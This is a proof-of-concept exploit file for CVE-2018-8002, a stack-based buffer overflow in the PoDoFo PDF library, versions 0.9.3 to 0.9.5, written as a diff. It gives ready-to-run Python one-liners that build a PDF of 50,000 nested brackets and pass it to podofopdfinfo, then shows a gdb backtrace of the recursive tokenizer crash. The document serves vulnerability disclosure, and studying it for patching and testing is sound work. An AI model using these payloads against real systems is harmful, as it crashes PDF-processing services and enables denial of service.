@@ -1,0 +1,66 @@
+# Exploit Title: PoDoFo 0.9.5 - Stack-Based Buffer Overflow (PoC)
+# Date: 25.06.2018
+# Software Link: https://sourceforge.net/projects/podofo/
+# Vuln Version: 0.9.5
+# CVE: cve-2018-8002
+# Vulnerability Details:  https://bugzilla.redhat.com/show_bug.cgi?id=1548930
+# Exploit Author: r4xis
+https://github.com/r4xis
+
+
+
+exploit
+-------------
+podofo 0.9.3 (tested on ubuntu 16.04 32 bit)
+$ python -c 'print "%PDF- 1 0 obj<<" + "["*50000' > poc.pdf;podofopdfinfo poc.pdf
+
+podofo 0.9.4 (tested on debian 9.4 64 bit)
+$ python -c 'print "%PDF- 1 0 obj" + "["*50000 + "startxref 5%%EOF"' > poc.pdf ;podofopdfinfo poc.pdf
+
+podofo 0.9.5 (tested on ubuntu 18.04 64 bit)
+$ python -c 'print "%PDF- 1 0 obj" + "["*50000 + "startxref 5%%EOF"' > poc.pdf ;podofopdfinfo poc.pdf
+
+Note: Also you can use "<<" characters;
+$ python -c 'print "%PDF- 1 0 obj" + "<<"*50000 + "startxref 5%%EOF"' > poc.pdf ;podofopdfinfo poc.pdf
+
+reason
+-----------
+Recursive functions call to each others, until the stack overflow.
+
+backtrace 
+-----------
+for "[" chars;
+...
+#28 0x00007ffff7ad00af in PoDoFo::PdfTokenizer::ReadArray(PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) () from /usr/lib/libpodofo.so.0.9.5
+#29 0x00007ffff7acf57b in PoDoFo::PdfTokenizer::ReadDataType(PoDoFo::EPdfDataType, PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) ()
+   from /usr/lib/libpodofo.so.0.9.5
+#30 0x00007ffff7ad00af in PoDoFo::PdfTokenizer::ReadArray(PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) () from /usr/lib/libpodofo.so.0.9.5
+#31 0x00007ffff7acf57b in PoDoFo::PdfTokenizer::ReadDataType(PoDoFo::EPdfDataType, PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) ()
+   from /usr/lib/libpodofo.so.0.9.5
+#32 0x00007ffff7ad00af in PoDoFo::PdfTokenizer::ReadArray(PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) () from /usr/lib/libpodofo.so.0.9.5
+#33 0x00007ffff7acf57b in PoDoFo::PdfTokenizer::ReadDataType(PoDoFo::EPdfDataType, PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) ()
+   from /usr/lib/libpodofo.so.0.9.5
+#34 0x00007ffff7ad00af in PoDoFo::PdfTokenizer::ReadArray(PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) () from /usr/lib/libpodofo.so.0.9.5
+#35 0x00007ffff7acf57b in PoDoFo::PdfTokenizer::ReadDataType(PoDoFo::EPdfDataType, PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) ()
+   from /usr/lib/libpodofo.so.0.9.5
+#36 0x00007ffff7ad00af in PoDoFo::PdfTokenizer::ReadArray(PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) () from /usr/lib/libpodofo.so.0.9.5
+#37 0x00007ffff7acf57b in PoDoFo::PdfTokenizer::ReadDataType(PoDoFo::EPdfDataType, PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) ()
+   from /usr/lib/libpodofo.so.0.9.5
+#38 0x00007ffff7ad00af in PoDoFo::PdfTokenizer::ReadArray(PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) () from /usr/lib/libpodofo.so.0.9.5
+#39 0x00007ffff7acf57b in PoDoFo::PdfTokenizer::ReadDataType(PoDoFo::EPdfDataType, PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) ()
+   from /usr/lib/libpodofo.so.0.9.5
+#40 0x00007ffff7ad00af in PoDoFo::PdfTokenizer::ReadArray(PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) () from /usr/lib/libpodofo.so.0.9.5
+#41 0x00007ffff7acf57b in PoDoFo::PdfTokenizer::ReadDataType(PoDoFo::EPdfDataType, PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) ()
+   from /usr/lib/libpodofo.so.0.9.5
+#42 0x00007ffff7ad00af in PoDoFo::PdfTokenizer::ReadArray(PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) () from /usr/lib/libpodofo.so.0.9.5
+#43 0x00007ffff7acf57b in PoDoFo::PdfTokenizer::ReadDataType(PoDoFo::EPdfDataType, PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) ()
+   from /usr/lib/libpodofo.so.0.9.5
+#44 0x00007ffff7ad00af in PoDoFo::PdfTokenizer::ReadArray(PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) () from /usr/lib/libpodofo.so.0.9.5
+#45 0x00007ffff7acf57b in PoDoFo::PdfTokenizer::ReadDataType(PoDoFo::EPdfDataType, PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) ()
+   from /usr/lib/libpodofo.so.0.9.5
+#46 0x00007ffff7ad00af in PoDoFo::PdfTokenizer::ReadArray(PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) () from /usr/lib/libpodofo.so.0.9.5
+#47 0x00007ffff7acf57b in PoDoFo::PdfTokenizer::ReadDataType(PoDoFo::EPdfDataType, PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) ()
+   from /usr/lib/libpodofo.so.0.9.5
+#48 0x00007ffff7ad00af in PoDoFo::PdfTokenizer::ReadArray(PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) () from /usr/lib/libpodofo.so.0.9.5
+#49 0x00007ffff7acf57b in PoDoFo::PdfTokenizer::ReadDataType(PoDoFo::EPdfDataType, PoDoFo::PdfVariant&, PoDoFo::PdfEncrypt*) ()
+...
